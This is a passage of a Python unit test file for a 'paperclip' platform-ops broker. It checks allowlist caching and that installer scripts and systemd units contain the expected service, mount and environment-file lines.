            broker._allowlist_cache = None
            self.allowlist_path.unlink()
            with self.assertRaisesRegex(broker.BrokerError, "allowlist is not installed"):
                broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })

    def test_allowlist_cache_is_reused(self):
        with self.paths():
            broker._allowlist_cache = None
            # First call loads from file
            with patch.object(broker, "run_command", return_value=(0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")):
                broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
            cache = broker._allowlist_cache
            # Second call should reuse cache (even if file is deleted)
            self.allowlist_path.unlink()
            with patch.object(broker, "run_command", return_value=(0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")):
                broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
            self.assertIs(broker._allowlist_cache, cache)


class PlatformOpsDeploymentWiringTests(unittest.TestCase):
    """Prevent a tested broker from shipping without live Hermes wiring."""

    def test_installer_installs_and_dark_masks_broker_unit(self):
        installer = MODULE_PATH.with_name("install-dark.sh").read_text()
        self.assertIn(
            '"${SCRIPT_DIR}/paperclip-platform-ops-broker.service" '
            "/usr/local/lib/systemd/system/paperclip-platform-ops-broker.service",
            installer,
        )
        self.assertIn(
            "systemctl disable --now paperclip-platform-ops-broker.service",
            installer,
        )
        self.assertIn(
            "systemctl mask paperclip-gloops.service "
            "paperclip-controlled-swarm.service paperclip-gloops-handshake.service",
            installer,
        )
        self.assertIn("paperclip-platform-ops-broker.service", installer)

    def test_hermes_unit_binds_registered_brokers_not_campaign_lifecycle(self):
        unit = MODULE_PATH.with_name("paperclip-hermes-execution.service").read_text()
        self.assertIn(
            "Requires=docker.service paperclip-github-push-broker.service "
            "paperclip-github-read-broker.service "
            "paperclip-platform-ops-broker.service",
            unit,
        )
        self.assertNotIn("paperclip-campaign-deadman.service", unit)
        self.assertIn(
            "--mount type=bind,src=/run/paperclip-platform-ops-broker,"
            "dst=/run/paperclip-platform-ops-broker",
            unit,
        )

    def test_product_service_graph_is_campaign_independent_offline(self):
        verifier = MODULE_PATH.with_name("verify-product-service-lifecycle.py")
        repo_root = MODULE_PATH.parents[3]
        result = subprocess.run(
            [sys.executable, str(verifier), "--repo-root", str(repo_root)],
            check=False,
            capture_output=True,
            text=True,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("campaign-lifecycle independent", result.stdout)

    def test_paperclip_units_source_the_install_bound_release_pin(self):
        installer = MODULE_PATH.with_name("install-dark.sh").read_text()
        service = MODULE_PATH.with_name("paperclip-gloops.service").read_text()
        handshake = MODULE_PATH.with_name(
            "paperclip-gloops-handshake.service"
        ).read_text()
        self.assertIn(
            "printf 'PAPERCLIP_IMAGE=%s\\n' \"${IMAGE}\" "
            '>>"${CONFIG_DIR}/runtime.env"',
            installer,
        )
        self.assertNotIn("Environment=PAPERCLIP_IMAGE=", service)
        self.assertNotIn("Environment=PAPERCLIP_IMAGE=", handshake)
        self.assertIn(
            "EnvironmentFile=/etc/paperclip-gloops/runtime.env",
            service,
        )
        self.assertIn(
            "EnvironmentFile=/etc/paperclip-gloops/runtime.env",
            handshake,
        )

    def test_controlled_swarm_activates_broker_but_expiry_preserves_it(self):
        activate = MODULE_PATH.with_name("activate-controlled-swarm.sh").read_text()
        runtime_activate = MODULE_PATH.with_name(
            "activate-controlled-swarm-runtime.sh"
        ).read_text()
        stop = MODULE_PATH.with_name("stop-controlled-swarm.sh").read_text()
        self.assertIn(
            "readonly PLATFORM_OPS_BROKER='paperclip-platform-ops-broker.service'",
            activate,
        )
        self.assertIn('"${SYSTEMCTL}" start "${PLATFORM_OPS_BROKER}"', runtime_activate)
        self.assertIn('"${SYSTEMCTL}" is-active --quiet "${unit}"', runtime_activate)
        self.assertNotIn("systemctl stop paperclip-platform-ops-broker.service", stop)


if __name__ == "__main__":
    unittest.main()
